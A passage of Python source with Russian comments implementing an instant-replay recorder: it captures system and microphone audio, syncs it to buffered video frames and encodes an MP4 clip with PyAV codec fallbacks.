                    logging.info(f"🎵 Найден Stereo Mix: {device['name']} (idx={i})")
        
        # Выбираем лучшее устройство
        target_devices = stereo_mix_devices if stereo_mix_devices else all_input_devices[:3]  # Первые 3 если нет Stereo Mix
        
        if not target_devices:
            logging.warning("🔊 Не найдено входных аудио устройств")
            replay_audio_available_out = False
            return
        
        # Функция захвата звука
        def audio_callback(indata, frames, time_info, status):
            if status:
                logging.debug(f"System audio status: {status}")
            
            chunk = indata.copy().astype('float32')
            # Конвертируем в стерео
            if len(chunk.shape) == 1:
                chunk = np.repeat(chunk.reshape(-1, 1), 2, axis=1)
            elif chunk.shape[1] == 1:
                chunk = np.repeat(chunk, 2, axis=1)
            elif chunk.shape[1] > 2:
                chunk = chunk[:, :2]
                
            with replay_audio_lock_out:
                replay_audio_buffer_out.append(chunk)
                if len(replay_audio_buffer_out) > replay_max_audio_chunks:
                    replay_audio_buffer_out.pop(0)
        
        # Пробуем устройства по приоритету
        for device_idx, device_name, max_channels in target_devices:
            try:
                logging.info(f"🎵 Пробую устройство: {device_name} (idx={device_idx})")
                
                # Определяем количество каналов (предпочитаем стерео)
                channels = min(2, max_channels) if max_channels > 0 else 1
                
                # Создаем поток
                stream = sd.InputStream(
                    device=device_idx,
                    channels=channels,
                    samplerate=replay_audio_rate,
                    blocksize=replay_audio_chunk,
                    dtype='float32',
                    callback=audio_callback
                )
                
                # Пробуем запустить
                stream.start()
                logging.info(f"✅ Системный звук запущен: {device_name} ({channels} каналов)")
                replay_audio_available_out = True
                replay_audio_recording_out = True
                
                # Держим поток активным
                while replay_audio_recording_out:
                    time.sleep(1.0)
                
                stream.stop()
                stream.close()
                return  # Успешно завершили
                
            except Exception as e:
                logging.warning(f"❌ Устройство {device_name} failed: {e}")
                continue
        
        # Если ничего не сработало
        logging.warning("🔊 Все системные устройства failed - системный звук недоступен")
        replay_audio_available_out = False
        
    # except Exception as e:
    #     logging.exception(f"System audio loop failed: {e}")
    #     replay_audio_available_out = False
    #     replay_audio_recording_out = False

def instant_replay_audio_loopback_loop_old():
    global replay_audio_available_out, replay_audio_recording_out
    # Старая поврежденная функция - отключена
    logging.info("🔊 Old system audio function disabled (broken code)")
    replay_audio_available_out = False
    replay_audio_recording_out = False

def instant_replay_audio_mic_loop():
    """Захват микрофона для Instant Replay"""
    global replay_audio_buffer_mic, replay_audio_recording_mic, replay_audio_available_mic
    
    try:
        import sounddevice as sd
        import numpy as np
        import time
        
        logging.info("🎤 Запуск захвата микрофона...")
        replay_audio_recording_mic = True
        replay_audio_available_mic = False
        
        def _ensure_stereo(arr):
            """Конвертирует аудио в стерео формат"""
            if arr.ndim == 1:
                arr = arr.reshape(-1, 1)
            if arr.shape[1] == 1:
                arr = np.repeat(arr, 2, axis=1)
            elif arr.shape[1] > 2:
                arr = arr[:, :2]
            return arr
            
        def audio_cb(indata, frames, time_info, status):
            """Callback для обработки микрофонного аудио"""
            try:
                if status:
                    if 'overflow' in str(status).lower():
                        # Overflow - снижаем громкость
                        chunk = _ensure_stereo(indata.copy().astype('float32')) * 0.5
                    else:
                        logging.debug(f"Mic status: {status}")
                        chunk = _ensure_stereo(indata.copy().astype('float32'))
                else:
                    chunk = _ensure_stereo(indata.copy().astype('float32'))
                
                with replay_audio_lock_mic:
                    replay_audio_buffer_mic.append(chunk)
                    # Ограничиваем размер буфера
                    if len(replay_audio_buffer_mic) > replay_max_audio_chunks:
                        replay_audio_buffer_mic.pop(0)
            except Exception as e:
                logging.debug(f"Mic callback error: {e}")
        
        # Находим микрофонное устройство
        try:
            # Пробуем получить дефолтное входное устройство
            default_input = sd.query_devices(kind='input')
            logging.info(f"🎤 Найден микрофон: {default_input['name']}")
            
            mic_channels = min(2, int(default_input.get('max_input_channels', 1)))
            
            stream_mic = sd.InputStream(
                device=None,  # Используем дефолтное
                channels=mic_channels,
                samplerate=replay_audio_rate,
                blocksize=replay_audio_chunk,
                dtype='float32',
                callback=audio_cb,
                latency='low'
            )
            
            stream_mic.start()
            replay_audio_available_mic = True
            logging.info(f"✅ Микрофон запущен ({mic_channels}ch @ {replay_audio_rate}Hz)")
            
            # Держим поток живым
            while replay_audio_recording_mic:
                time.sleep(1.0)
                
            stream_mic.stop()
            stream_mic.close()
                
        except Exception as e:
            logging.warning(f"⚠️ Микрофон недоступен: {e}")
            replay_audio_available_mic = False
            
    except Exception as e:
        logging.error(f"❌ Ошибка потока микрофона: {e}")
        replay_audio_available_mic = False
    finally:
        replay_audio_recording_mic = False

# Старая функция отключена
def instant_replay_audio_loopback_loop_method2():
    global replay_audio_available_out, replay_audio_recording_out
    try:
        import sounddevice as sd
        import numpy as np
        
        logging.info("🔊 Old method 2 disabled")
        
        # Метод 2: Sounddevice с упрощенной конфигурацией
        try:
            import sounddevice as sd
            import numpy as np
            
            logging.info("🎵 Метод 2: Упрощенный sounddevice...")
            replay_audio_recording_out = True
            
            def audio_cb(indata, frames, time_info, status):
                if status:
                    logging.debug(f"Audio status: {status}")
                
                chunk = indata.copy().astype('float32')
                # Конвертируем в стерео
                if len(chunk.shape) == 1 or chunk.shape[1] == 1:
                    chunk = np.repeat(chunk.reshape(-1, 1), 2, axis=1)
                elif chunk.shape[1] > 2:
                    chunk = chunk[:, :2]
                with replay_audio_lock_out:
                    replay_audio_buffer_out.append(chunk)
            try:
                stream_out = sd.InputStream(
                    samplerate=replay_audio_rate,
                    channels=2,  # Always use stereo
                    dtype='float32',
                    blocksize=replay_audio_chunk,
                    callback=audio_cb
                )
                stream_out.start()
                logging.info(f"✅ Упрощенный sounddevice запущен")
                replay_audio_available_out = True
            except Exception as e:
                logging.warning(f"Упрощенный sounddevice failed: {e}")
        except Exception as e:
            logging.info(f"Метод 2 failed: {e}")
        
        # Метод 3: PyAudio прямой захват
        try:
            import pyaudio
            import numpy as np
            
            logging.info("🎵 Метод 3: PyAudio прямой захват...")
            
            def pyaudio_capture():
                global replay_audio_buffer_out, replay_audio_recording_out
                try:
                    pa = pyaudio.PyAudio()
                    
                    # Ищем loopback устройство
                    loopback_device = None
                    for i in range(pa.get_device_count()):
                        info = pa.get_device_info_by_index(i)
                        if 'loopback' in info.get('name', '').lower() or info.get('maxInputChannels', 0) > 0:
                            loopback_device = i
                            logging.info(f"Found potential loopback: {info.get('name')}")
                            break
                    
                    if loopback_device is not None:
                        stream = pa.open(
                            format=pyaudio.paFloat32,
                            channels=2,
                            rate=replay_audio_rate,
                            input=True,
                            input_device_index=loopback_device,
                            frames_per_buffer=replay_audio_chunk
                        )
                        
                        logging.info("✅ PyAudio loopback stream opened")
                        replay_audio_available_out = True
                        
                        while replay_audio_recording_out:
                            try:
                                data = stream.read(replay_audio_chunk, exception_on_overflow=False)
                                audio_array = np.frombuffer(data, dtype=np.float32)
                                
                                # Reshape to stereo
                                if len(audio_array) >= replay_audio_chunk * 2:
                                    chunk = audio_array.reshape(-1, 2)
                                    with replay_audio_lock_out:
                                        replay_audio_buffer_out.append(chunk)
                                        if len(replay_audio_buffer_out) > replay_max_audio_chunks:
                                            replay_audio_buffer_out.pop(0)
                            except Exception as e:
                                logging.debug(f"PyAudio read error: {e}")
                                break
                        
                        stream.close()
                    pa.terminate()
                except Exception as e:
                    logging.debug(f"PyAudio setup error: {e}")
            
            threading.Thread(target=pyaudio_capture, daemon=True).start()
            logging.info("✅ PyAudio метод запущен")
            return
            
        except Exception as e:
            logging.info(f"Метод 3 failed: {e}")
            
        # Если ничего не сработало - используем микрофон как системный звук
        logging.info("🎤 Все методы системного звука failed, использую микрофон как основной источник")
        replay_audio_available_out = False
        
    except Exception as e:
        logging.exception(f"Instant Replay AUDIO loop failed: {e}")
        replay_audio_recording_out = False

def instant_replay_audio_loopback_loop_old():
    global replay_audio_buffer_out, replay_audio_recording_out, replay_audio_available_out
    try:
        import sounddevice as sd
        import numpy as np
        replay_audio_recording_out = True
        def audio_cb(indata, frames, time_info, status):
            if status and 'overflow' not in str(status).lower():
                logging.warning(f"Loopback audio status: {status}")
            elif 'overflow' in str(status).lower():
                # Overflow is common and not critical, log only occasionally
                pass
            chunk = indata.copy().astype('float32')
            with replay_audio_lock_out:
                replay_audio_buffer_out.append(chunk)
                if len(replay_audio_buffer_out) > replay_max_audio_chunks:
                    replay_audio_buffer_out.pop(0)
        try:
            # Enumerate WASAPI output devices and try loopback on each
            extra = None
            try:
                extra = sd.WasapiSettings(loopback=True)
            except Exception:
                extra = None
            wasapi_idx = None
            try:
                for idx, ha in enumerate(sd.query_hostapis()):
                    if 'wasapi' in ha.get('name', '').lower():
                        wasapi_idx = idx; break
            except Exception:
                wasapi_idx = None
            devices = []
            try:
                devices = sd.query_devices()
            except Exception:
                devices = []
            candidates = []
            for i, d in enumerate(devices):
                try:
                    if wasapi_idx is not None and d.get('hostapi') == wasapi_idx and int(d.get('max_output_channels', 0)) > 0:
                        candidates.append(i)
                except Exception:
                    continue
            # Smart device selection: prefer speakers/headphones, avoid microphones
            try:
                def_name = None
                def_idx = None
                try:
                    def_idx = sd.default.device[1]
                    def_name = sd.query_devices(def_idx).get('name')
                    logging.info(f"🔊 Default output device: '{def_name}' (idx={def_idx})")
                except Exception:
                    pass
                
                # Prioritize by device name patterns
                speakers = []
                headphones = []
                others = []
                for idx in candidates:
                    try:
                        info = sd.query_devices(idx)
                        name = (info.get('name') or '').lower()
                        # Skip obvious microphones
                        if any(x in name for x in ['microphone', 'микрофон', 'mic ', 'input']):
                            continue
                        # Prioritize speakers
                        if any(x in name for x in ['speaker', 'динамик', 'колонки', 'realtek']):
                            speakers.append(idx)
                        # Then headphones/USB audio
                        elif any(x in name for x in ['headphone', 'наушник', 'usb audio', 'bluetooth']):
                            headphones.append(idx)
                        else:
                            others.append(idx)
                    except Exception:
                        others.append(idx)
                
                # Order: default device first (if in any category), then speakers, headphones, others
                if def_idx is not None:
                    final_candidates = []
                    if def_idx in speakers:
                        final_candidates = [def_idx] + [x for x in speakers if x != def_idx] + headphones + others
                    elif def_idx in headphones:
                        final_candidates = [def_idx] + speakers + [x for x in headphones if x != def_idx] + others
                    elif def_idx in others:
                        final_candidates = [def_idx] + speakers + headphones + [x for x in others if x != def_idx]
                    else:
                        final_candidates = speakers + headphones + others
                    candidates = final_candidates
                else:
                    candidates = speakers + headphones + others
                    
                logging.info(f"🎧 Audio device priority: {len(speakers)} speakers, {len(headphones)} headphones, {len(others)} others")
            except Exception as e:
                logging.warning(f"Audio device prioritization failed: {e}")
                pass
            if not candidates:
                # Fallback: try default output device index
                try:
                    candidates = [sd.default.device[1]]
                except Exception:
                    candidates = []
            # Skip RMS pre-scan to avoid freezes, just prefer default by name matching
            # candidates are already ordered by preference
            def _ensure_stereo(arr):
                import numpy as _np
                if arr.ndim == 1:
                    arr = arr.reshape(-1, 1)
                if arr.shape[1] == 1:
                    arr = _np.repeat(arr, 2, axis=1)
                elif arr.shape[1] > 2:
                    arr = arr[:, :2]
                return arr
            def audio_cb(indata, frames, time_info, status):
                if status and 'overflow' not in str(status).lower():
                    logging.warning(f"Loopback audio status: {status}")
                elif 'overflow' in str(status).lower():
                    # Reduce overflow noise for better audio quality
                    chunk = _ensure_stereo(indata.copy().astype('float32')) * 0.3
                else:
                    chunk = _ensure_stereo(indata.copy().astype('float32'))
                with replay_audio_lock_out:
                    replay_audio_buffer_out.append(chunk)
            opened = False
            for dev_idx in candidates:
                if opened:
                    break
                try:
                    dinfo = sd.query_devices(dev_idx)
                    # Prefer output channel count for WASAPI loopback
                    max_out = int(dinfo.get('max_output_channels', 2)) or 2
                    max_in = int(dinfo.get('max_input_channels', 0)) or 0
                    logging.info(f"WASAPI device idx={dev_idx} name='{dinfo.get('name')}' max_out={max_out} max_in={max_in}")
                    tries = []
                    # Skip devices with no output channels (can't be loopback sources)
                    max_out = int(dinfo.get('max_output_channels', 0))
                    if max_out == 0:
                        logging.info(f"Skipping device {dev_idx} - no output channels")
                        continue
                    
                    # Try WASAPI audio capture (compatible with all sounddevice versions)
                    try:
                        stream_out = sd.InputStream(
                            samplerate=replay_audio_rate,
                            channels=2,  # Always use stereo
                            dtype='float32',
                            blocksize=replay_audio_chunk,
                            device=dev_idx,
                            callback=audio_cb,
                            extra_settings=sd.WasapiSettings(exclusive=False)
                        )
                        stream_out.start()
                        logging.info(f"✅ WASAPI audio started on device '{dinfo['name']}' with stereo")
                        replay_audio_available_out = True
                        opened = True
                        break
                    except Exception as e:
                        logging.warning(f"WASAPI failed on idx={dev_idx}: {e}")
                        # Try regular input mode as fallback
                        try:
                            stream_out = sd.InputStream(
                                samplerate=replay_audio_rate,
                                channels=1,  # Mono fallback
                                dtype='float32',
                                blocksize=replay_audio_chunk,
                                device=dev_idx,
                                callback=audio_cb
                            )
                            stream_out.start()
                            logging.info(f"✅ Regular audio input started on device '{dinfo['name']}' with mono")
                            replay_audio_available_out = True
                            opened = True
                            break
                        except Exception as e2:
                            logging.warning(f"Regular input also failed on idx={dev_idx}: {e2}")
                            continue
                    except Exception as e:
                        logging.warning(f"WASAPI Loopback failed on idx={dev_idx}: {e}")
                        # Try regular input mode as fallback
                        try:
                            stream_out = sd.InputStream(
                                samplerate=replay_audio_rate,
                                channels=1,  # Mono fallback
                                dtype='float32',
                                blocksize=replay_audio_chunk,
                                device=dev_idx,
                                callback=audio_cb
                            )
                            stream_out.start()
                            logging.info(f" Regular audio input started on device '{dinfo['name']}' with mono")
                            replay_audio_available_out = True
                            opened = True
                            break
                        except Exception as e2:
                            logging.warning(f"Regular input also failed on idx={dev_idx}: {e2}")
                            continue
                except Exception as e:
                    logging.warning(f"Loopback device error idx={dev_idx}: {e}")
            if not opened:
                logging.warning("Loopback stream failed for all WASAPI devices; trying PyAudio WASAPI loopback fallback")
                # Fallback: PyAudio WASAPI loopback
                try:
                    import pyaudio
                    import numpy as _np
                    pa = pyaudio.PyAudio()
                    wasapi_idx = None
                    for i in range(pa.get_host_api_count()):
                        hai = pa.get_host_api_info_by_index(i)
                        if hai.get('type') == pyaudio.paWASAPI:
                            wasapi_idx = i
                            break
                    if wasapi_idx is None:
                        raise RuntimeError("PyAudio WASAPI host API not found")
                    loop_idx = None
                    loop_ch = 2
                    # Try to match default output device name from sounddevice
                    def_name = None
                    try:
                        import sounddevice as _sd
                        def_name = _sd.query_devices(_sd.default.device[1]).get('name')
                    except Exception:
                        def_name = None
                    preferred = None
                    first_loop = None
                    for i in range(pa.get_device_count()):
                        di = pa.get_device_info_by_index(i)
                        if di.get('hostApi') != wasapi_idx:
                            continue
                        if not di.get('isLoopbackDevice'):
                            continue
                        if first_loop is None:
                            first_loop = i
                        if def_name:
                            nm = di.get('name') or ''
                            if def_name in nm:
                                preferred = i
                                break
                    sel = preferred if preferred is not None else first_loop
                    if sel is not None:
                        info = pa.get_device_info_by_index(sel)
                        loop_idx = sel
                        try:
                            loop_sr = int(info.get('defaultSampleRate') or replay_audio_rate)
                        except Exception:
                            loop_sr = replay_audio_rate
                        try:
                            loop_ch = max(1, min(2, int(info.get('maxInputChannels') or 2)))
                        except Exception:
                            loop_ch = 2
                    else:
                        raise RuntimeError("No PyAudio WASAPI loopback device found")
                    if loop_idx is None:
                        raise RuntimeError("No PyAudio WASAPI loopback device found")
                    def pa_cb(in_data, frame_count, time_info, status):
                        try:
                            arr = _np.frombuffer(in_data, dtype=_np.float32)
                            if loop_ch > 1:
                                arr = arr.reshape(-1, loop_ch)
                            else:
                                arr = arr.reshape(-1, 1)
                            # ensure stereo
                            if arr.shape[1] == 1:
                                arr = _np.repeat(arr, 2, axis=1)
                            elif arr.shape[1] > 2:
                                arr = arr[:, :2]
                            with replay_audio_lock_out:
                                replay_audio_buffer_out.append(arr)
                                if len(replay_audio_buffer_out) > replay_max_audio_chunks:
                                    replay_audio_buffer_out.pop(0)
                        except Exception:
                            pass
                        return (None, pyaudio.paContinue)
                    stream = pa.open(format=pyaudio.paFloat32, channels=loop_ch, rate=loop_sr,
                                     input=True, input_device_index=loop_idx, frames_per_buffer=replay_audio_chunk,
                                     stream_callback=pa_cb)
                    stream.start_stream()
                    replay_audio_available_out = True
                    logging.info(f"Instant Replay AUDIO: PyAudio loopback started (idx={loop_idx}, ch={loop_ch}, sr={loop_sr})")
                    globals()['replay_audio_rate_out_current'] = loop_sr
                    while replay_audio_recording_out and stream.is_active():
                        time.sleep(0.5)  # Reduce audio loop frequency
                    try:
                        stream.stop_stream(); stream.close()
                    except Exception:
                        pass
                    try:
                        pa.terminate()
                    except Exception:
                        pass
                except Exception as e:
                    logging.warning(f"PyAudio loopback fallback failed: {e}")
                    replay_audio_available_out = False
                    replay_audio_recording_out = False
        except Exception as e:
            logging.warning(f"Loopback stream failed: {e}")
            replay_audio_available_out = False
            replay_audio_recording_out = False
    except Exception as e:
        logging.warning(f"Loopback audio loop failed: {e}")
        replay_audio_available_out = False
        replay_audio_recording_out = False

def instant_replay_audio_mic_loop():
    global replay_audio_buffer_mic, replay_audio_recording_mic, replay_audio_available_mic
    try:
        import sounddevice as sd
        import numpy as np
        replay_audio_recording_mic = True
        def _ensure_stereo(arr):
            import numpy as _np
            if arr.ndim == 1:
                arr = arr.reshape(-1, 1)
            if arr.shape[1] == 1:
                arr = _np.repeat(arr, 2, axis=1)
            elif arr.shape[1] > 2:
                arr = arr[:, :2]
            return arr
        def audio_cb(indata, frames, time_info, status):
            if status and 'overflow' not in str(status).lower():
                logging.warning(f"Mic audio status: {status}")
            elif 'overflow' in str(status).lower():
                # Reduce overflow noise for better audio quality
                chunk = _ensure_stereo(indata.copy().astype('float32')) * 0.5
            else:
                chunk = _ensure_stereo(indata.copy().astype('float32'))
            with replay_audio_lock_mic:
                replay_audio_buffer_mic.append(chunk)
        try:
            # choose an input device; prefer default input
            mic_device = None
            try:
                mic_device = sd.default.device[0]
            except Exception:
                mic_device = None
            mic_ch = 2
            try:
                probe_dev = mic_device if mic_device is not None else sd.default.device[0]
                dinfo = sd.query_devices(probe_dev)
                mic_ch = max(1, min(2, int(dinfo.get('max_input_channels', 2))))
                try:
                    mic_sr = int(dinfo.get('default_samplerate') or replay_audio_rate)
                except Exception:
                    mic_sr = replay_audio_rate
            except Exception:
                mic_ch = 2
                mic_sr = replay_audio_rate
            with sd.InputStream(device=mic_device, channels=mic_ch, samplerate=mic_sr, blocksize=replay_audio_chunk*2, dtype='float32', callback=audio_cb, latency='high'):
                replay_audio_available_mic = True
                logging.info(f"Instant Replay AUDIO: microphone started (ch={mic_ch}, sr={mic_sr})")
                globals()['replay_audio_rate_mic_current'] = mic_sr
                while replay_audio_recording_mic:
                    sd.sleep(100)
        except Exception as e:
            logging.warning(f"Mic stream failed: {e}")
            replay_audio_available_mic = False
            replay_audio_recording_mic = False
    except Exception as e:
        logging.warning(f"Mic audio loop failed: {e}")
        replay_audio_available_mic = False
        replay_audio_recording_mic = False

def save_instant_replay():
    global replay_saving_in_progress, replay_video_buffer, replay_audio_buffer_out, replay_audio_buffer_mic
    global replay_audio_available_out, replay_audio_available_mic
    
    logging.info("🎬 INSTANT REPLAY START - checking audio availability...")
    logging.info(f"🔊 System audio available: {replay_audio_available_out}")
    logging.info(f"🎤 Microphone available: {replay_audio_available_mic}")
    logging.info(f"🔊 System audio buffer size: {len(replay_audio_buffer_out)}")
    logging.info(f"🎤 Microphone buffer size: {len(replay_audio_buffer_mic)}")
    # Prevent multiple simultaneous saves
    if replay_saving_in_progress:
        logging.warning("⚠️ Instant Replay already in progress, skipping...")
        return
    replay_saving_in_progress = True
    try:
        import av
        import numpy as np
        import tempfile
        duration = 0.0
        with replay_lock:
            if len(replay_video_buffer) == 0:
                logging.warning("Instant Replay: видео буфер пуст")
                return None
            video_items = list(replay_video_buffer)
        # Support legacy buffers without timestamps
        if video_items and isinstance(video_items[0], tuple):
            # Cut to last 30s by timestamp to avoid long hangs when capture slows down
            all_frames = [it[0] for it in video_items]
            all_ts = [it[1] for it in video_items]
            cutoff = all_ts[-1] - 30.0
            idx0 = 0
            for k in range(len(all_ts)):
                if all_ts[k] >= cutoff:
                    idx0 = k
                    break
            video_frames = all_frames[idx0:]
            ts_list = all_ts[idx0:]
        else:
            video_frames = list(video_items)
            ts_list = [None] * len(video_frames)
        # ВАЖНО: Вычисляем длительность видео И временной диапазон
        if ts_list and ts_list[0] is not None and ts_list[-1] is not None:
            video_start_time = ts_list[0]  # Начало видео
            video_end_time = ts_list[-1]   # Конец видео
            duration = max(0.0, video_end_time - video_start_time)
            logging.info(f"📹 Видео: от {video_start_time:.2f}с до {video_end_time:.2f}с (длительность {duration:.2f}с)")
        else:
            video_start_time = None
            video_end_time = None
            duration = len(video_frames) / replay_fps
            logging.info(f"📹 Видео: {len(video_frames)} кадров (длительность {duration:.2f}с, без временных меток)")
        
        # КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ: берем аудио из ТОГО ЖЕ временного диапазона что и видео!
        # Вычисляем длительность одного аудио чанка
        chunk_duration = replay_audio_chunk / replay_audio_rate  # секунды на чанк
        
        with replay_audio_lock_out:
            all_out_chunks = list(replay_audio_buffer_out)
            # Если нет временных меток - просто берем последние чанки (старый метод)
            if video_start_time is None:
                chunks_needed = int(duration / chunk_duration) + 1
                out_chunks = all_out_chunks[-chunks_needed:] if len(all_out_chunks) > chunks_needed else all_out_chunks
                logging.info(f"🔊 Системный звук: взято {len(out_chunks)} чанков (последние {duration:.1f}с, без синхронизации)")
            else:
                # Новый метод: синхронизация по абсолютному времени
                total_chunks = len(all_out_chunks)
                audio_buffer_duration = total_chunks * chunk_duration
                
                # ВАЖНО: Проверяем что аудио буфер достаточно большой
                if audio_buffer_duration < duration * 0.9:
                    # Аудио буфер меньше чем видео - берем весь буфер
                    out_chunks = all_out_chunks
                    logging.warning(f"🔊 Системный звук: аудио буфер ({audio_buffer_duration:.1f}с) меньше видео ({duration:.1f}с) - взяты ВСЕ чанки")
                else:
                    # Аудио буфер достаточно большой - синхронизируем по времени
                    # Предполагаем что последний чанк соответствует video_end_time
                    first_chunk_time = video_end_time - audio_buffer_duration
                    
                    # Вычисляем индексы чанков для диапазона [video_start_time, video_end_time]
                    start_chunk_idx = int((video_start_time - first_chunk_time) / chunk_duration)
                    end_chunk_idx = int((video_end_time - first_chunk_time) / chunk_duration)
                    
                    # Убедимся что индексы в пределах буфера
                    start_chunk_idx = max(0, min(start_chunk_idx, total_chunks))
                    end_chunk_idx = max(0, min(end_chunk_idx, total_chunks))
                    
                    out_chunks = all_out_chunks[start_chunk_idx:end_chunk_idx]
                    logging.info(f"🔊 Системный звук: взято чанки [{start_chunk_idx}:{end_chunk_idx}] из {total_chunks} (от {video_start_time:.2f}с до {video_end_time:.2f}с)")
        
        with replay_audio_lock_mic:
            all_mic_chunks = list(replay_audio_buffer_mic)
            # Та же логика для микрофона
            if video_start_time is None:
                chunks_needed = int(duration / chunk_duration) + 1
                mic_chunks = all_mic_chunks[-chunks_needed:] if len(all_mic_chunks) > chunks_needed else all_mic_chunks
                logging.info(f"🎤 Микрофон: взято {len(mic_chunks)} чанков (последние {duration:.1f}с, без синхронизации)")
            else:
                total_chunks = len(all_mic_chunks)
                audio_buffer_duration = total_chunks * chunk_duration
                
                # ВАЖНО: Проверяем что аудио буфер достаточно большой
                if audio_buffer_duration < duration * 0.9:
                    # Аудио буфер меньше чем видео - берем весь буфер
                    mic_chunks = all_mic_chunks
                    logging.warning(f"🎤 Микрофон: аудио буфер ({audio_buffer_duration:.1f}с) меньше видео ({duration:.1f}с) - взяты ВСЕ чанки")
                else:
                    # Аудио буфер достаточно большой - синхронизируем по времени
                    first_chunk_time = video_end_time - audio_buffer_duration
                    
                    start_chunk_idx = int((video_start_time - first_chunk_time) / chunk_duration)
                    end_chunk_idx = int((video_end_time - first_chunk_time) / chunk_duration)
                    
                    start_chunk_idx = max(0, min(start_chunk_idx, total_chunks))
                    end_chunk_idx = max(0, min(end_chunk_idx, total_chunks))
                    
                    mic_chunks = all_mic_chunks[start_chunk_idx:end_chunk_idx]
                    logging.info(f"🎤 Микрофон: взято чанки [{start_chunk_idx}:{end_chunk_idx}] из {total_chunks} (от {video_start_time:.2f}с до {video_end_time:.2f}с)")
        total_audio_chunks = (len(out_chunks) if 'out_chunks' in locals() else 0) + (len(mic_chunks) if 'mic_chunks' in locals() else 0)
        logging.info(f"Instant Replay: сохранение {len(video_frames)} кадров ({duration:.1f}с) + {total_audio_chunks} аудио чанков")
        temp_dir = os.getenv('TEMP') or tempfile.gettempdir()
        try:
            os.makedirs(temp_dir, exist_ok=True)
        except Exception:
            pass
        # Уникальное имя с микросекундами чтобы избежать конфликтов в Telegram
        video_path = os.path.join(temp_dir, f'instant_replay_{int(time.time())}_{int(time.time()*1000000)%1000000}.mp4')
        
        # Функция для создания видео потока с выбранным кодеком
        def create_video_stream(container, codec_name, options=None):
            stream = container.add_stream(codec_name, rate=replay_fps)
            stream.width = TARGET_WIDTH
            stream.height = TARGET_HEIGHT
            stream.pix_fmt = 'yuv420p'
            if options:
                if 'bit_rate' in options:
                    stream.bit_rate = options.pop('bit_rate')
                stream.options = options
            return stream
        
        # Попытка создать контейнер с разными кодеками
        codecs_to_try = [
            ('h264_nvenc', {
                'preset': 'fast',
                'profile': 'baseline',
                'rc': 'vbr',
                'gpu': '0',
                'bf': '0',
                'g': str(replay_fps*2),
                'rc-lookahead': '0',
                'bit_rate': 6000000
            }),
            ('libx264', {
                'preset': 'ultrafast',
                'tune': 'zerolatency',
                'profile': 'baseline',
                'crf': '24',
                'bf': '0',
                'g': str(replay_fps*2)
            }),
            ('mpeg4', {'bit_rate': 5000000})
        ]
        
        video_stream = None
        codec_used = None
        
        for codec_name, codec_options in codecs_to_try:
            try:
                logging.info(f"Пробую кодек {codec_name}...")
                container = av.open(video_path, mode='w')
                video_stream = create_video_stream(container, codec_name, codec_options)
                codec_used = codec_name
                logging.info(f"✅ Используется кодек: {codec_name}")
                break
            except Exception as e:
                logging.warning(f"⚠️ Кодек {codec_name} недоступен: {e}")
                try:
                    container.close()
                except:
                    pass
                if codec_name == codecs_to_try[-1][0]:
                    raise Exception(f"Все кодеки недоступны. Последняя ошибка: {e}")
                continue
        try:
            video_stream.time_base = Fraction(1, replay_fps)
            try:
                # Strengthen timing metadata for some players (Telegram)
                video_stream.average_rate = Fraction(replay_fps, 1)
            except Exception:
                pass
            try:
                cc = getattr(video_stream, 'codec_context', None)
                if cc is not None:
                    cc.framerate = Fraction(replay_fps, 1)
                    cc.time_base = Fraction(1, replay_fps)
                    try:
                        cc.sample_aspect_ratio = Fraction(1, 1)
                    except Exception:
                        pass
            except Exception:
                pass
            try:
                video_stream.sample_aspect_ratio = Fraction(1, 1)
            except Exception:
                pass
        except Exception:
            pass
        audio_stream = None
        # Prepare mixed audio (loopback + mic)
        mixed_audio = None
        try:
            a_out = np.concatenate(out_chunks, axis=0) if len(out_chunks) else None
            a_mic = np.concatenate(mic_chunks, axis=0) if len(mic_chunks) else None
            # Resample to target rate if needed
            def _resample_to(arr, src_rate, dst_rate):
                if arr is None or src_rate == dst_rate:
                    return arr
                import numpy as _np
                n_src = arr.shape[0]
                n_dst = int(round(n_src * float(dst_rate) / float(src_rate)))
                if n_dst <= 0:
                    return arr
                x = _np.linspace(0.0, 1.0, n_src, endpoint=False)
                xp = _np.linspace(0.0, 1.0, n_dst, endpoint=False)
                out = _np.zeros((n_dst, arr.shape[1]), dtype=_np.float32)
                for c in range(arr.shape[1]):
                    out[:, c] = _np.interp(xp, x, arr[:, c]).astype(_np.float32)
                return out
            try:
                a_out = _resample_to(a_out, globals().get('replay_audio_rate_out_current', replay_audio_rate), replay_audio_rate)
            except Exception:
                pass
            try:
                a_mic = _resample_to(a_mic, globals().get('replay_audio_rate_mic_current', replay_audio_rate), replay_audio_rate)
            except Exception:
                pass
            desired_samples = int(max(0.0, duration) * replay_audio_rate)
            logging.info(f"📊 Синхронизация: длительность видео {duration:.2f}с, нужно {desired_samples} аудио сэмплов")
            
            if desired_samples > 0:
                # ВАЖНО: обрезаем с КОНЦА, а не с начала - берем последние N сэмплов
                if a_out is not None and len(a_out) > desired_samples:
                    before_len = len(a_out)
                    a_out = a_out[-desired_samples:]  # Берем ПОСЛЕДНИЕ сэмплы
                    logging.info(f"🔊 Системный звук обрезан: {before_len} -> {len(a_out)} сэмплов (последние {duration:.2f}с)")
                elif a_out is not None:
                    logging.info(f"🔊 Системный звук: {len(a_out)} сэмплов (без обрезки)")
                    
                if a_mic is not None and len(a_mic) > desired_samples:
                    before_len = len(a_mic)
                    a_mic = a_mic[-desired_samples:]  # Берем ПОСЛЕДНИЕ сэмплы
                    logging.info(f"🎤 Микрофон обрезан: {before_len} -> {len(a_mic)} сэмплов (последние {duration:.2f}с)")
                elif a_mic is not None:
                    logging.info(f"🎤 Микрофон: {len(a_mic)} сэмплов (без обрезки)")
            if a_out is not None and a_mic is not None:
                n = min(len(a_out), len(a_mic))
                a_out = a_out[:n]
                a_mic = a_mic[:n]
                mixed = a_out + a_mic
                mixed = np.clip(mixed, -1.0, 1.0)
                mixed_audio = mixed.astype(np.float32)
            elif a_out is not None:
                mixed_audio = a_out.astype(np.float32)
            elif a_mic is not None:
                mixed_audio = a_mic.astype(np.float32)
        except Exception as e:
            logging.warning(f"Audio mix failed: {e}")
            mixed_audio = None
        if mixed_audio is not None and mixed_audio.size > 0:
            try:
                audio_stream = container.add_stream('aac', rate=replay_audio_rate)
                audio_stream.bit_rate = 128000
                try:
                    audio_stream.layout = 'stereo'
                except Exception:
                    pass
                try:
                    audio_stream.time_base = Fraction(1, replay_audio_rate)
                except Exception:
                    pass
            except Exception as e:
                logging.warning(f"AAC недоступен ({e}), отправлю видео без аудио")
                audio_stream = None
        # Кодируем видео кадры с правильным PTS для 60 FPS
        t0 = ts_list[0] if ts_list and ts_list[0] is not None else None
